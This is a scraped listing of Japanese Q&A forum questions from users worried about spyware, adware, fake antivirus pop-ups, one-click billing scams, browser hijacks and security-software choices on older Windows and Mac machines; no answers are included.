こんにちは。スパイウェアらしきものにひっかかってしまいとても不安です。 今日インターネットを見ていたら、突然supashuriというセキュリティソフトみたいなもの警告画面が出てきて 「重要なシス脅威はコンピュータに見つかりました 次のシステム脅威はパソコンに見つかりました。これによりデータ損失、システムクラッシュが起こることがあります： 損失されたレジストリキーのデータ　危険レベル　高 Documents and Settingsフォルダに破損したファイル　危険レベル　中」 とあり、キャンセルのボタンを押すと、再度別の画面が開き 「警告：スキャンは未完了です。Windowsレジストリ、システムファイル のエラーの場合、コンピュータ機能への不安定性、フリーズ、情報損害 の恐れがあります。システムエラーを検出して修理するにはSupaShuriを再インストールして下さい。（推薦）」 という警告が出てきて、もう一度キャンセルすると 「SupaShuriは今エラー検出にスキャンを実行します。 要求されると、「実行」または「開く」を押してください。 このファイルは１００％ウィルスフリー、スパイウェアフリー及び アドウェアフリーと証明されデジタル署名がされています。」 という画面がまた出てきて、今度はOKボタンしかなく、焦って押してしまいました。普段のようなFirefoxのダウンロード画面は開かず、 何か、実行中を示すような画面が出たような気がするのですが、すぐに消えてしまいました。それ以降、再起動もしましたが、特にPCにおかしなところはないです。macを使っているので、もしかしたらsupashuriはmacには対応していないのかもしれませんが、スパイウェアは一見入り込んでも気付かないことが多いらしいので、すごく不安でメールなども開けません・・。不注意すぎたと反省しています。 スパイウェアの駆除ソフトもmac対応のものがあまりないようで、どうすればいいか悩んでいます。何か良いフリーソフトご存知の方いらっしゃいますか？また、supashuriとmacの関係などについて知っている方や、今回の ことについて良いアドバイスお持ちの方おられたら宜しくお願いします。
機能を無効にするとページが進むのですが、有効だと進みません
ｗｉｎｄｏｗｓＸＰを使用しています。ｎｏｒｔｏｎ２００７セキュリティソフトの期限が切れそうで困っています。どなたかいいお答えをいただけませんでしょうか? まず、更新についてですが更新するなら2年間！(若干や安いので)と思っています。ただ、再ダウンロードができるよううにする為には1260円×二年分も一緒にかかり値段が12000円ほどです。これは安いのでしょうか？電気屋でパックを購入したほうが得なのでは?と考えてしまいます。パックだとＣＤ付きなので再インストールの際楽かな・・・とも思っています。パソコン初心者なため、再インストール版を購入しないのは不安があります。 次に、更新・もしくは新しいｎｏｒｔｏｎ２００８を購入した際には必ずｎｏｒｔｏｎ２００７をアンインストールしないといけないのでしょうか？ また、いつもインターネットは頻繁にはしませんが海外との音楽のやり取りなどで使っています。ウイルスが心配です。ウイルスバスターは更新が無料と聞いたことがありますが本当ですか? 以上の三点で悩んでおり、ウイルスバスターに乗り換えるかも考えています。なかなか自分的に値段等ですっきりせず質問させていただきました。 ご回答宜しくお願い致します。
windows defenderで検索すると毎日、 ・spywareWin32/CnsMin と言うものが、検出されます。自分なりに色々と調べたのですが 少し有害だの、無視していても大丈夫と、様々です。 削除方法を示すサイトもあり、説明がありますが、ＰＣの素人の自分には、やり方がわかりません（削除方法の説明文の意味が理解できません）。このスパイウェアーは、無視しても大丈夫なのでしょうか？ ＪＷＯＲＤがなんだのこうだのと、様々ですが、どうしたらいいか分かりません。無視でいいのでしょうか？ ご存知の方いらっしゃいましたら、教えていただければ幸いです。 お願いします。
今現在のセキュリティ対策ソフトは、ノートンインターネットセキュリティ2008、SPYBOT、SpywareBlaster、BitDefender(コマンドライン版） で時々、X-Cleaner(オンラインスキャン）、カスペルスキー（オンライスキャン）などをしています。 スパイ対策としてSpy Sweeperが優れていると聞いたのですが、今使っているものとの併用は問題ないでしょうか？ あと他に良いフリーソフトがあったり、自分の組み合わせに問題などありましたら教えて頂きたいです。 もう一つ、砂箱というのは普通入れるものなのでしょうか？ あまり聞かないのですがどうなのかと思って・・・
出会い系みたいなサイトが勝手に出てきて困っていました。 なので、ここでお聞きして、対策を教えていただきました。 それでスパイウェア対策を施したのですが、何度やってもまた出てきてしまいます； スパイウェアの検索はパソコンを立ち上げるたびにやらなくてはいけないものなのですか？ 教えてください。
この前ウィンドウズライブメッセンジャーに登録して その後メッセンジャープラスってのをインストールしました。 そうしたら、カスペルスキーのセキュリティが トロイの木馬を検知しました。 trojan.win32.Obfuscated.enこんな名前？です。 それで駆除するをクリックしたら駆除できませんでしたって表示され、 もう一回チャレンジしても失敗したんでニッチもサッチも いかなくなってとりあえずスキップしました。 その後レベルを上げてスキャンしても見つかりませんでしたみたいな表示に変わりました…（プロテクションの検知のタグの所です） エクスプローラーで上のタグに書いてあったオブジェクトのファイル を探したんですけど見つかりません。 これって削除出来てませんよね？ 最近カスペの体験版入れたところなんで良くわからないです。 どなたか対処方法を教えて下さいませんか？ 不安でしょうがないです。
新しくパソコンを買いました。Windowsのxpです。 とりあえずウイルスバスター２００７をいれて安心してネットにつないでいたのですが、対ウイルスソフトはスパイウェア対策についてはあまり強くないということを知りました。実際スパイウェアが見つかったこともあります。そこで、調べた所Spybotなどのフリーソフトを入れればいいという事がわかったのですが、どうもウイルスバスターとは相性が悪いらしく不具合がでるらしいのです…。 ウイルスバスターのみの今の状態でのネットショッピングはやはり危険なのでしょうか？一応ｓｓｌの保護があるサイトなのですが不安です…。 現時点で出来る限りの対策がしたいのです。 必要ならウイルスバスターからカペルスキーに変えることも考えてます。
McAfee SecurityCenterをインストールしていますが、VirusScan Plus With SiteAdvisorをインストールすると完璧になりますか？　　　それともMcAfee SecurityCenterだけで大丈夫ですか？
セキュリティ対策として、NortonInternetSecurity2007と、Spybotを使用しております。 ネット接続する度にNortonのUpdateが行われ、Update後に自動的にクイックスキャンが走る設定になっています。 今日ネット接続してクイックスキャンが行なわれた際、質問タイトルのAdware.SystemProcessが発見されました。昨日のクイックスキャンでは発見されなかった為、昨日から今日にかけての間に入り込んだのか、あるいは以前から入り込んでいたのをNortonがUpdateされたことによって発見できるようになったのか。最近インストールしたフリーソフトも特に覚えがありませんので、前述したどちらであるか判断はできません。 Notonのサイトやクイックスキャン結果のプロパティでAdware.SystemProcessについて調べたところ、リスクの危険度が高レベルとなっていました。但しその内訳として、パフォーマンス・削除・ステルスといった項目についてのみ高レベルとなっており、プライバシーに関しては中レベルとなっていました。そのなかでも、パフォーマンス項目にある「追加のセキュリティリスクのダウンロードやインストールを許可することがあります」という部分が、危険度高レベルと判断される主な理由とされているのだと勝手に推測しています。 最も気になっているのが、中レベルとされているプライバシーに関してです。スキャン結果のプロパティでは「重要な情報の公表は少なく、Web参照の追跡などはありません。未公開のプライバシーポリシーがあったり、プライバシーポリシーが動作と一致しなくなります」とありました。 (1)アドウェアはそもそも利用者の趣味嗜好を分析して広告を表示させるもの、と認識しているのですが、Web参照の追跡などはないとのこと。それでは、ローカルに保存してあるファイル（WordやExcel文書、画像、お気に入りファイルなど）を漏洩させてしまうのでしょうか？ (2)このAdware.SystemProcessが勝手にファイルを作成したり、レジストリの作成・レジストリへの値追加をしてしまうことはNortonのサイトから分かりました。しかしこれによってどのような行為が行なわれてしまうか、といった点について説明が少ないように思います。広告表示・セキュリティ設定の変更・他のアドウェアを勝手にインストール、といった行為の他に何か行なわれるのでしょうか？（特に個人情報の収集・流出といった点について） (3)Web参照の追跡などはない、とスキャン結果にはありますが、ネットワーク上での動作監視は一切行なっていないのでしょうか？もし監視されているのであれば、ネットワーク上で使用しているパスワード等を変更しなくてはならない為、判断に困っております。 以上、長文となり誠に申し訳ございませんが、どなたか教えていただけますと幸いです。よろしくお願い致します。
先程、スパイウェアクリーナーでスキャンしたところ、 ・スパイウェア名　ＤｉｇｉｔａｌＮａｍｅｓＡ ・カテゴリ　Ｔｒｏｊａｎ　というものが検出されました。 http://ca.com/jp/securityadvisor/pest/pest.aspx? … 上記のサイトで該当するスパウェア名が見つかったのですが、いまいちどういった危険性があるのかよくわかりません。 不審なサイトにアクセスした覚えも無いですし、メールを見た覚えもありません。 カテゴリがＴｒｏｊａｎだったので不安です。 スパイウェアはすでに封印しました。 このスパイウェアにどういった危険性があるのか、このままネットを使っていても大丈夫なのか教えてください。 よろしくお願いします。
あるサイトに行って、18歳以上ですか？のところで　はい　のボタンを押してしまいました。その瞬間　登録ありがとうございました　の画面になって二日以内にお金を払わないと自宅にハガキを送ると書いてありました。ぼくが興味本位で行ったのが悪かったと思いますが、どうしたらいいですか？
動画のサイトでクリックしたところ年齢認証のポップアップが出て、18歳以上のボタンをクリックすると、再度、年齢認証のポップアップがでてそこには細かい文字で90,000円かかると書かれていました。クリックするとＩＰアドレスで認証されたのか分かりませんが、その後に登録完了の画面になりました。 これってクリック詐欺ですか？
フリーソフトAd-AwareSEの日本語版をインストールしたいです。 すみません。教えて下さい。
ＩＥ６でトップページが変更される ＩＥ６でトップページと検索のところが4318.comに変更されます。 スパイボットやマカフィーのウィルス検索等ですべて削除しているの ですが、ＩＥ６をリセットしても再度4318.comになってしまいます。 レジストリかＳＴＡＲＴＵＰに書き換えるようになっていると思わるのですが わかりません。よろしくお願いします。
先日PCを立ち上げましたら、ファンが強烈に廻っています。 驚いてタスクマネージャーで調べたところ、 IBMの後を引き継いだ中国のRENOVO社からのtvtsched.exeというのが裏で動作していました。cpu使用率50％です！ メーカーのサービスにしてはひどすぎると思いませんか？ かまわず使い続けていたら、どうなったことか。 こんなことはあるのでしょうか？
ワンクリック詐欺に遭ってしまいました。 パソコンで変なサイトをクリックしたら、勝手に会員登録されてしまい ４９０００円払うように指示されました。 住所とか名前は登録の時に出してないのですが、IPアドレスとプロバイダー名がダウンロードされてばれてしまいました。 払った方がいいにでしょうか？ 住所とか相手に知られてのでしょうか？
ワンクリック詐欺のようです。１８歳ですか？をクリックすると突然何かダウンロードなのか転送なのか表示というか画像というかパッとでて消えたと思ったら次に登録完了\５００００と表示がでていました。名前も住所も何も登録していないのに完了などできるのかな…と一瞬ボーっとした後すぐページを閉じてしまいました。住所など個人のことは登録していなくても請求などくるのでしょうか？特に気になるのは、ダウンロードだったのか何が起きたのかです。ファイルに何か残っているのでしょうか？どのように処理をしたらよいのでしょうか？教えてください。
パソコンの調子がおかしいので、ウイルスバスター2007で検索をしたら、スパイウェアがいくつか見つかりました これら全てを削除しても問題ないのでしょうか ちなみにウイルスは発見されていません
セキュリティの警告が頻繁に表示されて、困っています。 次のような内容です。 「セキュリティの警告 　このサイトととり交じりわす情報は、他の人から読み取られたり変更されることはありません。しかし、このサイトのセキュリティ証明書には問題があります。 　セキュリティ証明書は、信頼された証明期間から発行されています。 ！セキュリティ証明書は有効期限が切れたか、まだ有効になっていません。 　このセキュリティ証明書には、表示しようとしているページの名前と一致する有効な名前があります。 　　はい（Y）　　いいえ（N)　　証明書表示　」 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　 とパスワードなどを聞く表示が出たときに表示されます。 どうにかして表示しないような設定があるのでしょうか？ ウィルスソフトは、ウィルスバスターズ2006をインストールしています。 トレンド社へ問い合わせてみても、「わからない」との回答でした。 どなたかおわかりの方、ご指導のほどよろしくお願いします。
IPアドレスがばれてしまうとそこから色んな情報が漏れ 次第によってはハッキングまでされてしまう・・・ ということを聞いたことがあります 掲示板の書き込みなどでもIPアドレスは分かってしまうとのことだったのですが、実のところIPアドレスからどれだけの情報が漏れてしまうのでしょうか？ パソコンはインターネットを主に利用しているため、 とても気になります
　名前を出していいのかわかりませんが、Spyware Doctor というスパイウエア対策ソフトがアンインストールできません。アンインストールのToolがないようです。 　ちなみに再インストールもできませんでした。 　 　目的は、ウイルスバスター2008をインストールしたいのですが、Spyware Doctor と競合するそうで、ウイルスバスターもインストールできませんでした。 「プログラムの追加と削除」でも削除できないソフトの削除の方法をご存じの方は、教えてください。よろしくお願いします。
IEで検索サイトから検索をかけ、見たいHPをクリックすると、全く別のサイトにとんでしまいます。どうしてでしょうか。 GOOGLEでもYAHOOでも同じ現象が起こります。検索ワードはどんな言葉を入れても、まず外国の変なサイトにとんでしいます。 おかしいなと思って戻るボタンを押してからまたクリックすると今度はちゃんとしたHPにたどりつきます。 SPYPODというフリーのスパイウエア対策ソフトやマカフィーインターネットセキュリティでスキャンをかけてあやしいCOOKIYを駆除してもダメでした。 IE７に変えてみたけれどもダメでした。 ちなみにFIREFOXでは何ともありません。 いろんなことを試してみましたがどうしても分かりません。 今の所、それ以外に調子がわるいところは見あたらないですが、何とも気持ちが悪いです。 どうか教えていただけると幸いです。
こんにちは。 いつもこちらでお世話になっております。 「放置」するとしたスパイウェアを削除する方法を教えてください。 初心者の質問で申し訳ないのですが、よろしくお願いいたします。
ウイルスバスターのリアルタイム検索に常にひっかかるため非常に邪魔なのですが、ググってみたところADW_PIGSEARCH.Aしか載っていませんでした。 ADW_PIGSEARCH.Aの削除方法はわかったのですが、感染しているアドウェアとはやはり少し違うらしく、どう削除すればよいのかわかりません。 対応方法を教えて頂けないでしょうか。 また、最近よく勝手にIEが立ち上がり、中国語のサイトが表示されます。これに関してはとても困っている、というわけではないのですがやはり邪魔です。これもアドウェアのせいなのでしょうか？ これについても出来ればよろしくお願いします。
最近急に、パソコンを立ち上げる時、必ず韓国のサイトが表示されるようになりました。画面はYahoo!Koreaの検索画面で二つ出てきます。両方とも違う言葉を検索しているんですが、なぜ表示せれるようになったのか、また何が検索されているのかは分かりません； 検索されている言葉： 뮤프리 퓖E? （韓国語なので文字化けしたものです） まがりなりともYahoo!なのでウィルスとかではないだろうと思っているのですが心配です・・・。ウィルスバスターでウィルス検索をしてもスパイウェア検索しても、特に何も出てきません。 パソコンを立ち上げる時に出てくるだけで、他にあまり不便はないのですが、パソの反応が鈍いようにも感じます。どうしたら出てこなくすることが出来るでしょうか？？回答よろしくお願いします。
初心者です。 どのサイトでもそうですが、 銀行など重要なパスワードもあります。 サイトによってはパスワードの変更を求められますが、 ネットで使用していて、パスワードを盗まれる事がありますか？ それは、外部の一般人に限らずサイト運営管理者の場合もありますか？ カテ違いなら別のカテを教えて下さい。 お願いします。
カスペルスキーの体験版を昨日導入して 今日早速使用しました。 そして、完全スキャンしたところ not-a-virus:AdWare.Win32.Agent.bc というアドウェアがファイルに含まれて検出されました。 このファイルはIOデーターのHDDを購入した際に付属されていた 「ポチっとな」というフリーソフトの一部のファイルでした。 このファイルについてIOデーターに質問をしようとしたところ その質問コーナーがサーバーの不具合？のため 出来ませんでした。 uninstall.dllというファイルのため 名前からしてこのフリーソフトをアンインストールする際に 使用するのかもしれないと思い、削除を保留状態にしています。 ちなみに一昨日ウイルスバスターでスキャンした時は これは検出されませんでした。 dll系はむやみに削除などはしないほうが良いと聞いたことがあるので どうしたら良いか悩んでいます。 ご存知の方は是非お教えください。お願い致します。
今、ウィルスバスターをスキャンさせたら、「検出数　１２」とメッセージが出ましたが、「駆除しますか？」ともなんとも出ていませんでした。 そのまま閉じたのですが、このままにしておいてよかったのでしょうか？ これらのスパイウエアが今後いたずらすることはないのでしょうか？ なお、検知したスパイウエアはすべて[COOIKE_xxxx]と表記されているものばかりです。
タイトルのとおりなのですが、最近ウィルスバスターで検索するたびに「Cookie_SiteStat」が検出されます。 検出場所は、 Internet Explorer Cache\int.sitestat.com となっています。 検出時に「次回から自動削除する」の選択や、インターネットオプションで「sitestat.com」のCookieを常にブロックするように設定をしてみたりはしたのですが、いまだに検出されます。 「Cookie＝危険なファイル」でないことは分かっていますが、やはり気持ちがいいものではないので、検出されなくする方法をご存知の方は教えてください。よろしくお願いします。
spybotでスパイウェアを探し出してcookie以外のスパイウェアを削除 したいんですが、いつも削除の途中でフリーズします。どうしたらい いのでしょうか？ あと、削除しきれてないのですがリカバリーに途中まで削除された物 が入ってました、これも削除しないとスパイウェアは削除されたこと にはならないのですか？
読んでくれた方ありがとうございます。 最近Firefoxを使うようになったのですが今まで普通にIEで使っていたお気に入りのデータをFirefoxに移したいのですがどうすれば移せるのでしょうか？ それとFirefoxにもブックマーク以外のお気に入りの様なものがあるのでしょうか？ 分かる方がいましたら解答お願いします。
見てくれた方ありがとうございます。 初めに恐らく私のパソコンabout：blankというスパイウェアに犯されていると思います。 それとネットではまず自分で調べるというマナーがありますが、教えてgooやGoogleなどでも自分で調べて似たような症状やそれの対策方法もあり何度も色々な方法で試してみました。 ですが他の方とは少し症状が違うようでabout：blankのスパイウェアを消去することができません。 症状としてはIEでウェブブラウザなどを見たりしていてIEの右上の×を押して消そうとするとIEのタイトルのようなところにabout:blankと表記されて消すことができません。 もし似たような症状を経験した方やこの症状の解決方法を知ってる方・分かるかもしれないと言う方はぜひ教えてください。（OSの再インストールはあくまで最終手段としてできるだけしたくはありません）
ネットをしていて複数のページを開いた際、aboutblankと空白のページが出たり、表示画面途中のまま閉じれなくなってしまいます。 こちらで対策法を探し http://www.higaitaisaku.com/removeaboutblank.html のページの作業をしてみたのですが、再度スキャンするとどうしても８個の治っていません・・・ そんなにパソコンに詳しくないので、これ以上どうしてよいかわかりません(>_<) どなたか、適切な方法があれば教えてください。
MicrosoftWindowsIEFirewallBypass　がＤドライブのSpyBotのスキャンで出てきたのですが、これはスパイウェアでしょうか、それともウィンドウズのアップデートで入ったもので安全でしょうか。 ＰＣ環境はＣ：Ｍｅ，　Ｄ；ＸＰ，　ＥＦほか・・全ＦＡＴ３２ Ｄドライブ～ＸＰ-Ｐro-ＳＰ２、 フレッツ・セーフティーでルーターにウィルスバスターが入ってますので、ＰＣにはSpyBotしか入ってません。
フリーのファイアーウォールの導入を考えているのですが、 XPのSP2に標準搭載されてるファイアウォールに別の火の壁を立てると競合して機能が低下しますか？ それとも二本(以上)立てた方が強力になって良いのでしょうか？ また、kingsoftかOutpostかZonealarmの何れかのにしようと思うのですが、 XPのファイヤーウォールと併用したり代わりに使用して効果的なヤツはどれでしょうか？ それともXP標準のだけの方が良いのでしょうか？
CAのオンラインスキャンで digitalnames.a トロイ　ハイリスク とでたのですが検索してみるとMcaFeeでは問題ないようなことが書いてあります。 これは削除したほうがいいですか？
[Ad-Aware2007でスキャンを開始すると途中でUnhandledExceptionという画面が開き、停止してしまうのです。 二つのボタンが出てきて、「サイトに送信する」ボタンを押すと、そこでスキャンが終わってしまうのです。 これは何か問題があるということなのでしょうか？ ウィンドウズＸＰ ＳＰ２です ウィルスセキュリティを入れています。 干渉しあっているようなら削除すれば問題ないのでしょうか？？ 特にパソコンがフリーズしやすい。とかの症状は無いのですが、対応方法がありましたら、教えて頂きたいと思います。 よろしくお願いします]
とある海外串を使い目的のHPにアクセスしようとGoogleで検索したのですが、404ではなく見たこともないエラーが帰ってきました。 Google あなたのネットワークはスパイウエアに汚染されています。 　　　　　　Googleはあなたの検索を拒否します。 　　　　検索を続けるなら下にDFTWDYUKと入力してください 　　　　　　　　　　　 と出て指示された通り入力すると検索できました。 spybot等のアンチスパイウエアで検索しましたがクッキーしか引っかかりません。 串を通しただけでネットワークにスパイウエアを仕込めるのでしょうか？ そもそもネットワークはスパイウエアに感染するのでしょうか？ スパイウエアと聞いて気が気じゃないので感染しているのか、感染していた場合の対処方をお教えください。
先日、芸能人のHPを探していたら、変なアダルトサイトに入ってしまいました。早く抜けようとしたら、何を間違ったのか規約文書の下に設定されている承諾ボタンを押してしまいました。（決して故意ではありません。）その後、「設定変更？設定を保存？をしています。」といったメッセージが瞬時に現れ50,000円という表示が出てきました。本当に瞬時であったので、よく読み取れませんでした。そして、このサイトから抜けようと閉じるボタンを何度も押しますが、同じコメントが何度も出てきますので、最終的に強制終了して抜けました。 この場合、契約したことになるのでしょうか。 また、「設定変更？設定保存？しています」といった表示がでたことも気になります。個人情報が持ち出されたのでしょうか。それともパソコンの設定を変更されたのでしょうか。個人情報が持ち出されていないか、設定変更されていないか確認する方法はありますか。 ネットを続けていると、今後、多額な請求が来たりしないでしょうか。自分から情報の送信はしておりません。承諾ボタンをクリックしてしまっただけです。 どなたか教えていただけないでしょうか。 ちなみにネット接続ははADSLでウイルスバスタ2007を入れています。
スパイウェアースキャンしたら BurstMedia CasaleMedia DoubleCliok FastClick HitBox LinkSynergy MediaPlex Statcounter TagASaurus WebTrends live Zedo これらが検出されました。 使用ソフトは[Spybot] 全て消去してもよろしいのでしょうか？ 最近インターネットが開きにくくもなりました。 どなたか教えてください。
今日Spybotと言うスパイウェアー対策ソフトをＤＬして スキャンしたら「CnsMin」と言うのが検出されたんですが これは何か害があるのでしょうか？？ もし何の問題も無いのならば消去しないつもりです。 どなたか教えてください。
今年の２月に泥棒に入られ、パソコン盗まれました。その後新品のパソコンを購入し、誰にも触らせていないのに、友達に送ったメールの内容がパソコンを盗んだと思われる人にばれています。警察にも届出しましたが、携帯電話も新しい番号に変えてもばれるし、メールなんて新しいアドレスを作っても作ってもばれるし、つい最近ダウンロードしたスカイプにまで、登録希望のメッセージが送られてきました。　パソコンのメーカーに問合せましたが、初期化してみてくださいとしか言われません。初期化したら今までのメアドを利用しても大丈夫でしょうか？　最近はチャットもしていませんが、何月何日にｘｘｘとどういう会話をしたでしょ？と内容まで知っています。　盗まれた後、警察にも届出をして、警察からは携帯電話の番号も変えるようにいわれ、変えましたがそれでもいたずら電話がかかってくるし、今度何かあったら警察に言おうと思っていたら、家の前まできて、警察を呼ぼうとしたらいきなり殴られ、逃げられました。これは余談ですが、そこまでする人なので、次に何をされるかと思うと怖くてしょうがありません。　セキュリティーを入れていてもこの始末です。どうしたらよいでしょうか？　最近その人から受け取ったメールには「わけのわからないメールを送るのはやめてください」と書いてありました。私は送っていないのにそういうってことは、まるで私が人に送ったメールがすべて彼のパソコンに転送されているみたいです。また、私のメール友達で私ですらその人の住所を知らないのに、そのストーカーは知っていました。本当か嘘かわかりませんが、某会社で働いていたときにその特別なパスワードを入れると個人情報がすべてわかるので、真面目に登録している人なら住所もわかると話していました。　そんな人に目を付けられてしまったので次に何をされるやら。。。　話が長くてすみません。メアドもすべて捨ててもいい覚悟で対処したいと思っていますので、今後のベストな方法を教えてください。　よろしくお願いします。
某掲示板を閲覧中、不覚にも表示されてたURLをクリックしたところ 海外のアダルトサイトに飛ばされました。 さらに「○○○へ移動しますか？」との旨のウィンドが出現。 Alt+F4 でそのウィンドを消し、続けて元のアダルトサイトの IEウィンドも消そうとしたところ、 なぜかお気に入り登録追加をした時と同じ動作になりました。 なんだこれは？と思いキャンセルし、タスクマネージャを起動し、 アダルトサイトのIEウィンドのタスクの終了を選択すると、 またお気に入り登録追加動作が。 IEのウィンドをそのまま終了することができなくなったので OSの再起動でその場はごまかしたのですが、 一体これはどういう事なのでしょうか？ 何かに感染したものかとウィルススキャンを試しましたが 何も発見されませんでした。 一体なんだったのかわからず不安で仕方ありません。 また事前にこの手の動作を防御する手段はないものでしょうか？ アドバイスよろしくお願いします。 環境は下記の通りです。 WindowsXP HOME SP2 Kaspersky Internet Security 7.0 IE6でActivXは切ってます。気休めにwscript.exe削除してます。
CWShredderをアップデートしたいのですが Check For Updateをクリックすると "Unable to check for updates” というメッセージが出てアップデートすることが できません。 どうすればアップデートすることができるのでしょうか。 解決策をご存知の方お願いいたします。
この半月位、スパイスィーパーを外してカスペルスキー１本にしていました。 カスペルスキーで完全スキャンしましたが、今までなにも検出されませんでした。 スパイスィーパーを入れて、スキャンをした所「Trojan Horse検出内容ldpinch Trojan」が検出されました。 一応、隔離してありますが削除した方が良いのでしょうか。 パソコンへの影響はこれで大丈夫でしょうか。 今回初めての事なので、よく判らない事だらけです。 （カスペルスキーだけでは弱いのでしょうか。）
キングソフトのKingsoft Internet Security2007付属ソフトのKingsoft Antispyware 2007を起動してスキャンを開始してもトロイの木馬スキャン結果は数十万個のファイル中、０個のトロイ木馬と件数が表示されるが、 スパイウェアスキャンの結果：０個のスパイウェア０個を削除とスルー表示され直ぐにメモリスキャンへ移り、スパイウェアスキャンを実行していない様だ！ 以前アンチスパイウェアソフトはSG Antispy2,Spyware Blaster,AntiSpy-Pro,Spybot S&D,Spyware Doctor等専用の有料ソフトでスキャンを行っていたが何処のソフトもMalware定義ＤＢを更新して比較スキャンしていたので スキャン終了まで数分は要していたのにこのKAS2007のSpywareスルーしてスキャンしているとは思えないから「どうしたらスキャンする様になるのか？教えて頂きたい！」お願い致します。 因みに、今年４月に購入した時からず～と同じ症状です。
不正アクセスについてです。他人のIDとパスワードでメールを見たとします。見ただけでもアクセス禁止方に当てはまると思いますが、見ただけで実際にそれを被害届けを出して見た人間のIPアドレスから身元が判明するものでしょうか？
インターネット閲覧中に「ダイアルアップで接続しますか？」と表示されたのでOKをクリック、終了時に「他の人が接続しています」と表示されました。 yahooBB回線で、1台しかPCはありませんし他の誰かが使用する様な環境では無いので不安に思い、質問させていただきました。 ｐｃに全く詳しくないので今どういう状況になっているのか分からないので教えてください。
こんにちは さっそくなんですがスパイポッドでadvertising.com　がでました それを削除使用と思ったのですができません もしそれが悪いスパイウェアだったら心配です 危険か安全かどうやったら削除できるか教えてください
スパイウェアを駆除するためにspybotを使ってスパイウェアをスキャンしたんですが、削除しようと思ったら勝手にパソコンが再起動してしまいました↓ もう１度スキャンしようと思ったら、また勝手に再起動されてしまいました↓↓ スパイウェアはどのようにして駆除すればいいのでしょうか。 初心者なので全くわけがわかりません↓↓ SHARPのメビウス、osはXPで、セキュリティはウイルスバスターを使っています。 何か対策はありますでしょうか？ もうわけがわからないので情報は少ないですが、どなたか教えてください。
昨夜、とあるサイトのCGIに入力をし、自動返信をOUTLOOKで受信後に、PCの終了が５分以上掛かりました。今朝起動時には、やはり5分以上かかり、今まで画面に出なかったBIOSの設定画面がでて、F1を押して続けるとWindowsXPとなりますが、カタッカタ、カタッカタとHDの音もでるようになり、ネットやプログラムの認識にも3分くらいかかります。固まってしまうことも多々あり困ってます。ウイルスバスターを使用していてスパイウエアは24とでたので、削除しました。この先元のように、サクサク動作させるには何が一番効果がいいでしょうか。PCは新品で購入して2週間。昨晩のCGIまではなんの問題もありませんでした。よろしくお願いいたします。
Disney.co.jpが提供している「トゥーン・タウン　オンライン」というネットゲームを以前から使用していたのですが、ここ数日データのアップデートをする最中で、Trojan-Spy.Win32.KeyLogger.jmが検知されてしまいます。 パス名：c:\Program files\Disney\Disney Online\Toontown_jp ファイル名：GLH0012.tmp 検知後はファイルが隔離されるため、アップデートが出来ずに終了し、起動できずに困っています。 トゥーン・タウンのサポートセンターに問い合わせしたところ、パソコンにインストールされているセキュリティソフトが誤認識しているためではないかということで、対処方法などが分かりません。 セキュリティソフトは「ウイルスセキュリティＺＥＲＯ」を導入しています。 またシマンテックのオンラインでもチェックを試みましたが、ＰＣ内でウイルスは検知できませんでした。 どなたか対処法など分かりましたら、ぜひ教えてください。 よろしくお願いします。
今ウイルス対策ソフトとしてカスペルスキーを使っているんですが、最近、頻繁に「svchost.exeが変更されました」というメッセージが表示されます。 すごく気になるんですが、これはスパイウェア等と関係があるんでしょうか？
キュートという「グラビア」系の普通のサイトと思っていたのですが、そこからリンクして、その娘の動画を見るサイトに誘導されて、動画のダウンロードでワンクリックしたら、入会が完了致しました！４９０００円の入会金・・という表示が現れて、プロパイダやIPアドレスが表示されました。退会するには、もう２回クリックしてとありましたが、流石にそれはしませんでした。ご存知の方、対処方法を教えてください。
You Tubuの動画保存方法がわかりません。教えてください。 あと、日本版のYouTubuはアメリカのYou Tubuと全く同じ動画があるのですか？
あまりPCのことを知らない初心者です。ノートン360でウイルス・ スパイウェアのスキャンをするとほぼ毎日、statse.webtrendslive.com というTracking Cookieがひっかかります。これはなんなのでしょうか。どこから入ってきているものなのか見当もつきません。完全に このCookieをPCに入らなくするにはどのようにしたらよいのでしょうか。どなたかお詳しい方ご教授いただけないでしょうか。よろしくお願いします。
あのすみません。兄がアダルトサイトに入会してしまい、その結果、変な画像が背景に張り付いてしまいます。しかも、インターネットなどをやっていると、５分刻みで画面に出てきてしまいます。一応それを端っこの方には移動できるのですが、画面に出てきてしまいます。背景を変えてもきえません。そこでタスクマネージャで調べました。結果、プロセスではSniperscope[1].exeというのがその変な画像でした。それをスタートボタンの「ファイルを指定して実行」をセーフモードや通常モードで調べましたがでてきませんでした。すみませんが、どうやったらこのプロセスを調べることができるのでしょうか？それともプロセスではダメなのでしょうか？できれば詳しく教えてください（＞＿＜）早い返答を待っています（＞＿＜）
芸能人ネタが書いてあるサイトをクリックしたら突然アダルトサイトの動画に 飛び消そうとしてクリックしたら「認証されました」という文字が 出てきて（誤って押してしまったみたいです）、ファイルが保存されたとかで ファイル画面まで出てきました（これは自動に消えました） すごく恐いです。会員登録なんかしてないのに勝手に登録完了なんてサイトへ 飛びました。このファイルごと消去したいですがどのようにしたらいいので しょうか？どこを構えばこのファイルは見つかりますか？ ちなみにこの動画の認証画面に６万か９万か金額が書いてあったのですが なんのことでしょうか？
何もしていないのに、 Ads served by rightonads というタイトルのIEのウインドウが勝手に現れます。 特に支障はないのですが、非常にうっとうしいです。 ウイルスバスターで検索かけて見たのですが、特に見つかりませんでした。 なにか、対処法があれば教えてください。
　二ヶ月ほど前に新しいパソコンを購入し、お試し版のウィルスバスターを使っていて、先日フレッツ光に入会したのでそちらのウィルス対策ツールVer1.5というのに変えたのですが、ウィルスバスターの頃からいちいち許可や拒否を選ぶのが面倒臭いと思い、不審ソフトウェア警戒システムを無効にしていました。しかし最近ふと思って、有効にして見つかった変更を見てみたら、ブラウザのセキュリティが無効になっていました。慌てて変更を元に戻したのですが、何かおかしなことになっていないか色々と見ていたら、パーソナルファイアーウォールのログに数日前までなかったＵＤＰというプロトコルのセキュリティブロックが大量に記録されていました。これは不正侵入を受けているのでしょうか？　パソコンにはあまり詳しくありません。すごく不安です。助けてください。そのＵＤＰの送信元ＩＰは［１２１．１０２］から始まって、送信先ＩＰは［１９２．１６８］から始まっています。セキュリティ検索はやってみましたが、クッキー以外何も引っかかってはきませんでした。
